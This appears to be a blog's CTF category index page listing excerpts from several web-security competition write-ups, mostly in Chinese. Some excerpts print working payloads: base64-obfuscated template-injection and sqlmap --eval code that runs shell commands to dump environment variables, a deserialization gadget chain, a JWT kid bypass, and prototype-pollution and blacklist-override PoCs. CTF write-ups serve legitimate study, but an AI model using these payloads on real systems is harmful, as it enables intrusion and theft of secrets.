<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Ctf | zoiltin&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="author" content="">
<link rel="canonical" href="https://zoiltin.github.io/categories/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" type="application/rss+xml" href="https://zoiltin.github.io/categories/ctf/index.xml">
<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/categories/ctf/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:url" content="https://zoiltin.github.io/categories/ctf/">
  <meta property="og:site_name" content="zoiltin&#39;s Blog">
  <meta property="og:title" content="Ctf">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="website">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ctf">
<meta name="twitter:description" content="">

</head>

<body class="list" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://zoiltin.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main"> 
<header class="page-header">
  <h1>
    Ctf
  </h1>
</header>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">强网杯 2025 CeleRace Writeup
    </h2>
  </header>
  <div class="entry-content">
    <p>越权 先看系统权限，使用了 superviser 维持了三个程序：
redis app.py (flask &#43; broker) worker 其中 /readflag 程序 worker 用户可以执行，所以最终目标需要已 worker 用户 RCE。
题目在 werkzeug 的基础上自己写了一个阉割版的 Flask，其中在处理中间件那部分存在逻辑漏洞。
在处理请求时，先通过 path 找到对应的 endpoint，然后再收集该 endpoint 的 middlewares：
def _collect_route_middlewares(self, endpoint: str, path: str) -&gt; list[MiddlewareCallable]: scoped = list(self.route_middlewares.get(endpoint, [])) if scoped: return scoped if not self.wildcard_middlewares: return scoped normalized_path = self._normalize_path(path) for pattern, middlewares in reversed(self.wildcard_middlewares): if self._pattern_matches(pattern, normalized_path): return list(middlewares) return scoped 但是在匹配 middlewares 之前会先进行 _normalize_path 操作。所以对于 path : /tasks/fetch/%2e%2e/asd 来说，能够争取找到 fetch endpoint，但当匹配 middlewares 时就变成了 /tasks/asd 了，匹配失败，导致进入该 endpoint 前不需要执行任何 middlewares，实现越权。...</p>
  </div>
  <footer class="entry-footer"><span title='2025-10-31 07:24:54 +0000 UTC'>October 31, 2025</span>&nbsp;·&nbsp;11 min</footer>
  <a class="entry-link" aria-label="post link to 强网杯 2025 CeleRace Writeup" href="https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">CTF记录-NCTF_2024, 红明谷CTF_2025
    </h2>
  </header>
  <div class="entry-content">
    <p>NCTF 2024 WEB AK ez_dash 过滤不全，可以通过&lt;%%&gt;执行python代码，但没有回显，用继承链获取bottle报错回显。
https://www.osgeo.cn/bottle/stpl.html#embedded-python-code 使用getattr绕过.，bottle.abort(401, &#34;message&#34;)函数可以直接报错返回内容。
&lt;%eval(getattr(getattr(__import__(&#39;base64&#39;), &#39;b64decode&#39;)(&#39;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp&#39;), &#39;decode&#39;)())%&gt; sqlmap-master 参数注入，sqlmap -hh查看详细信息：
--eval=EVALCODE Evaluate provided Python code before the request (e.g.&#34;import hashlib;id2=hashlib.md5(id).hexdigest()&#34;) sqlmap的eval可以执行python代码：
sqlmap -u http://localhost --eval=&#34;print(1)&#34; 通过__import__报错回显，注意payload不能包含空格，不然会被分割。
poc:
http://localhost --eval=__import__(__import__(&#39;os&#39;).popen(__import__(&#39;base64&#39;).b64decode(&#39;ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==&#39;).decode()).read()) ez_dash_revenge 远程环境pydash版本比较高，不允许覆盖__globals__和__builtin__，
黑名单检测代码pydash/helpers.py： RESTRICTED_KEYS内容为：
RESTRICTED_KEYS = (&#34;__globals__&#34;, &#34;__builtins__&#34;) 覆盖黑名单POC：
/setValue?name=pydash{&#34;path&#34;:&#34;helpers.RESTRICTED_KEYS&#34;,&#34;value&#34;:[]} 然后再通过__globals__覆盖题目自定义的黑名单,POC:
/setValue?name=setval{&#34;path&#34;:&#34;__globals__.__forbidden_name__&#34;,&#34;value&#34;:[]}{&#34;path&#34;:&#34;__globals__.__forbidden_path__&#34;,&#34;value&#34;:[]} bottle模板引擎使用正则匹配模板字符串，set_syntax代码如下：
def set_syntax(self, syntax): self._syntax = syntax self._tokens = syntax.split() if syntax not in self._re_cache: names = &#39;block_start block_close line_start inline_start inline_end&#39; etokens = map(re....</p>
  </div>
  <footer class="entry-footer"><span title='2025-03-23 17:02:50 +0000 UTC'>March 23, 2025</span>&nbsp;·&nbsp;6 min</footer>
  <a class="entry-link" aria-label="post link to CTF记录-NCTF_2024, 红明谷CTF_2025" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">CTF记录-VNCTF_2025, AliyunCTF 2025
    </h2>
  </header>
  <div class="entry-content">
    <p>VNCTF 5道web解出了4道
javaGuide /deser路由可以反序列化，有spring boot和fastjson 1.2.83的依赖。
反序列化有黑名单：
protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = {&#34;com.sun.org.apache.xalan.internal.xsltc.trax&#34;, &#34;javax.management&#34;, &#34;com.fasterxml.jackson&#34;}; int length = denyClasses.length; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(&#34;Unauthorized deserialization attempt&#34;, className); } } return super.resolveClass(desc); } 可以用signedObject二次反序列化绕过
利用链：
EventListenerList.readobject() -&gt;JSONArray.toString() -&gt;SignedObject.getObject() -&gt;EventListenerList.readobject() -&gt;JSONArray.toString() -&gt;Templates.getOutputProperties() fastjson1.2.83使用引用绕过。
Templates templates = new TemplatesImpl(); setFieldValue(templates,&#34;_bytecodes&#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,&#34;_class&#34;,null); setFieldValue(templates,&#34;_name&#34;,&#34;asd&#34;); JSONArray jsonArray1 = new JSONArray(); jsonArray1....</p>
  </div>
  <footer class="entry-footer"><span title='2025-02-09 15:21:50 +0000 UTC'>February 9, 2025</span>&nbsp;·&nbsp;9 min</footer>
  <a class="entry-link" aria-label="post link to CTF记录-VNCTF_2025, AliyunCTF 2025" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">CTF记录-SECCON_CTF_13th_Quals, AlpacaHack_Round_7
    </h2>
  </header>
  <div class="entry-content">
    <p>SECCON CTF 13th Quals Trillion_Bank 题目代码：
import fastify from &#34;fastify&#34;; import crypto from &#34;node:crypto&#34;; import fs from &#34;node:fs/promises&#34;; import db from &#34;./db.js&#34;; const FLAG = process.env.FLAG ?? console.log(&#34;No flag&#34;) ?? process.exit(1); const TRILLION = 1_000_000_000_000; const app = fastify(); app.register(await import(&#34;@fastify/jwt&#34;), { secret: crypto.randomBytes(32), cookie: { cookieName: &#34;session&#34; }, }); app.register(await import(&#34;@fastify/cookie&#34;)); const names = new Set(); const auth = async (req, res) =&gt; { try { await req.jwtVerify(); } catch { return res....</p>
  </div>
  <footer class="entry-footer"><span title='2024-11-25 20:10:50 +0000 UTC'>November 25, 2024</span>&nbsp;·&nbsp;11 min</footer>
  <a class="entry-link" aria-label="post link to CTF记录-SECCON_CTF_13th_Quals, AlpacaHack_Round_7" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Ciscn 2024 final Fobee wp
    </h2>
  </header>
  <div class="entry-content">
    <p>本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。
前言 拿到了前段时间ciscn 2024 final的web题附件，来复现一下Fobee这道题，顺便学习一下beetl的模板注入。
3.15.x及以前的版本 过滤的很少，随便绕过。贴几个公开的poc： https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3
3.16.0 3.16.0是题目使用的版本也是本文使用的版本。
测试环境为java8u65， beetl 3.16.0， solon 2.8.5
入口 @Mapping(&#34;/render&#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(&#34;render.htm&#34;); if (pass != null &amp;&amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(&#34;msg&#34;, getMD5Hash(result)); } else { model.put(&#34;msg&#34;, &#34;Render Page&#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。
public Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode !...</p>
  </div>
  <footer class="entry-footer"><span title='2024-07-27 18:21:03 +0800 CST'>July 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
  <a class="entry-link" aria-label="post link to Ciscn 2024 final Fobee wp" href="https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">d3ctf-2024-web-wp
    </h2>
  </header>
  <div class="entry-content">
    <p>d3pythonhttp 解决，一血
jwt绕过 def get_key(kid): key = &#34;&#34; dir = &#34;/app/&#34; try: with open(dir&#43;kid, &#34;r&#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[&#34;kid&#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[&#34;HS256&#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：
print(jwt.encode({&#34;username&#34;:&#34;admin&#34;,&#34;isadmin&#34;:true}, key, algorithm=&#34;HS256&#34;, headers={&#34;kid&#34;: &#34;frontend_keyasdasd&#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。
headers = {key: value for (key, value) in request.headers if key != &#39;Host&#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：...</p>
  </div>
  <footer class="entry-footer"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span>&nbsp;·&nbsp;6 min</footer>
  <a class="entry-link" aria-label="post link to d3ctf-2024-web-wp" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">bi0s CTF 2024 wp
    </h2>
  </header>
  <div class="entry-content">
    <p>required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:
const protobuf = require(&#34;protobufjs&#34;); protobuf.parse(&#39;option(a).constructor.prototype.verified = true;&#39;); console.log({}.verified); // returns true /create会进行protojs解析。
app.post(&#39;/create&#39;, (req, res) =&gt; { requestBody=req.body try{ schema = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;); root = protobuf.parse(schema).root; Note = root.lookupType(&#39;Note&#39;); [...] 在/customise可以修改settings.proto文件。
app.post(&#39;/customise&#39;,(req, res) =&gt; { try { const { data } = req.body; let author = data.pop()[&#39;author&#39;]; let title = data.pop()[&#39;title&#39;]; let protoContents = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;).split(&#39;\n&#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=&#34;user&#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=&#34;user&#34;];`; } fs....</p>
  </div>
  <footer class="entry-footer"><span title='2024-02-27 15:33:01 +0000 UTC'>February 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
  <a class="entry-link" aria-label="post link to bi0s CTF 2024 wp" href="https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">movectf_2024_wp
    </h2>
  </header>
  <div class="entry-content">
    <p>Checkin sorce:100
题目源码:
module movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector&lt;u8&gt;, ctx: &amp;mut TxContext) { assert!(string == b&#34;MoveBitCTF&#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } 带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。
# 转换为十六进制 print(&#34;0x&#34;) for i in &#34;MoveBitCTF&#34;: print(hex(ord(i)).replace(&#34;0x&#34;,&#34;&#34;),end=&#34;&#34;) 调用即可：
sui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200...</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-13 08:48:17 +0000 UTC'>January 13, 2024</span>&nbsp;·&nbsp;10 min</footer>
  <a class="entry-link" aria-label="post link to movectf_2024_wp" href="https://zoiltin.github.io/posts/movectf-2024-wp/"></a>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
